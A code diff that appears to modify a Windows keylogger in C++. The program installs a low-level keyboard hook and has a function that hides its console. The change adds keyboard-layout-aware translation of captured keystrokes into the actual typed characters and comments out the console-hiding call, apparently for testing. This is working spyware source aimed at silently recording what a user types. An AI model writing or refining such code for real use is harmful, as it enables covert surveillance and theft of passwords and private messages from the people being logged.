@@ -107,12 +107,56 @@ std::string GetTimestamp() {
     return buf;
 }
 
-std::string GetKeyName(DWORD vkCode) {
-    wchar_t keyNameW[256] = {0};
+HKL GetCurrentKeyboardLayout()
+{
+    HWND foregroundWnd = GetForegroundWindow();
+    if (!foregroundWnd)
+        return GetKeyboardLayout(0);
 
-    UINT scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);
-    LONG lParam = scanCode << 16;
+    DWORD threadId = GetWindowThreadProcessId(foregroundWnd, NULL);
+    return GetKeyboardLayout(threadId);
+}
 
+std::string GetCharFromKey(DWORD vkCode, UINT scanCode) {
+    BYTE keyboardState[256] = {0};
+    WCHAR buffer[5] = {0};
+
+    if (!GetKeyboardState(keyboardState)) return "[ERR_STATE]";
+
+    HKL keyboardLayout = GetCurrentKeyboardLayout();
+
+    int result = ToUnicodeEx(
+        vkCode,
+        scanCode,
+        keyboardState,
+        buffer,
+        4,
+        0,
+        keyboardLayout
+    );
+
+
+    if (result > 0) {
+        char ansiChar[5] = {0};
+        WideCharToMultiByte(CP_UTF8, 0, buffer, -1, ansiChar, 5, NULL, NULL);
+        char character[5] = {0};
+        int len = WideCharToMultiByte(
+            CP_UTF8,
+            0,
+            buffer,
+            -1,
+            character,
+            sizeof(buffer),
+            NULL,
+            NULL
+        );
+        return std::string(character);
+    }
+
+    return "";
+}
+
+std::string GetKeyName(DWORD vkCode,  UINT scanCode) {
     switch (vkCode) {
         case VK_SHIFT: return "[SHIFT]";
         case VK_LSHIFT: return "[LSHIFT]";
@@ -148,21 +192,21 @@ std::string GetKeyName(DWORD vkCode) {
         default: break;
     }
 
-    if (GetKeyNameTextW(lParam, keyNameW, 256)) {
-        char keyNameA[256] = {0};
-        WideCharToMultiByte(CP_ACP, 0, keyNameW, -1, keyNameA, 256, NULL, NULL);
-        return keyNameA;
+    if(GetCharFromKey(vkCode, scanCode) != ""){
+        return GetCharFromKey(vkCode, scanCode);
     }
 
     return "[Unknown]";
 }
+
 
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode >= 0) {
         KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;
 
         if (wParam) {
-            std::string keyName = GetKeyName(pKey->vkCode);
+            std::string keyName = GetKeyName(pKey->vkCode, pKey->scanCode);
+//            std::string keyName = GetCharFromKey(pKey->vkCode, pKey->scanCode);
             std::string keyState;
 
             if(wParam == WM_KEYDOWN){
@@ -212,7 +256,7 @@ void HideConsole() {
 }
 
 int main() {
-    HideConsole();
+//    HideConsole();
 
     SetHook();
 
